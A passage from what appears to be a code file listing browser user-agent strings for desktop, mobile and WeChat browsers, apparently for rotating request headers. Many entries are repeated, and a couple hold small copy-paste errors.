     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
